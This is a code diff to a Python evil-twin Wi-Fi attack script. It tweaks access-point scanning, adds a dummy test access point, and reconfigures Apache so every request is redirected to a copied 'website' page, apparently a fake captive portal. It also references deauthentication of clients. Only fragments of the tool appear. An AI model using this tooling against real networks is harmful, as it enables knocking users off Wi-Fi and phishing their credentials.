@@ -53,7 +53,7 @@ def scan_for_aps(interface):
     channel_changer = Thread(target=change_channel, args=(interface,))
     channel_changer.daemon = True
     channel_changer.start()
-    sniff(prn=callback_ap, iface=interface, timeout=10)
+    sniff(prn=callback_ap, iface=interface, timeout=20)
     global done_scanning
     done_scanning = True
 
@@ -144,6 +144,7 @@ def start_evil_twin(interface):
     #  scan for nearby access points
     print("[*] Scanning for nearby access points")
     scan_for_aps(interface)
+    ap_list.append(("00:00:00:00:00:00", "test"))
     print(f"[*] Found {len(ap_list)} access points")
 
     #  prompt user for access point to attack
@@ -203,8 +204,8 @@ def setup_apache_server():
         f.write("\tErrorLog ${APACHE_LOG_DIR}/error.log\n")
         f.write("\tCustomLog ${APACHE_LOG_DIR}/access.log combined\n")
         f.write("</VirtualHost>\n")
-        f.write("<Directory /var/www/html>\n")
-        f.write("\tRewriteEngine on\n")
+        f.write('<Directory "/var/www/html">\n')
+        f.write("\tRewriteEngine On\n")
         f.write("\tRewriteBase /\n")
         f.write("\tRewriteCond %{HTTP_HOST} ^www\\.(.*)$ [NC]\n")
         f.write("\tRewriteRule ^(.*)$ http://%1/$1 [R=301,L]\n")
@@ -213,8 +214,8 @@ def setup_apache_server():
         f.write("\tRewriteRule ^(.*)$ / [L,QSA]\n")
         f.write("</Directory>\n")
     #  set up apache server
-    bash("cp `pwd`/website/index.html /var/www/html/")
-    bash("systemctl start apache2")
+    bash("cp -r `pwd`/website/* /var/www/html/")
+    bash("a2enmod rewrite && service apache2 start")
 
 
 def setup_de_auth(interface):
@@ -265,4 +266,5 @@ def main():
 
 if __name__ == "__main__":
     killall()
+    time.sleep(2)
     main()
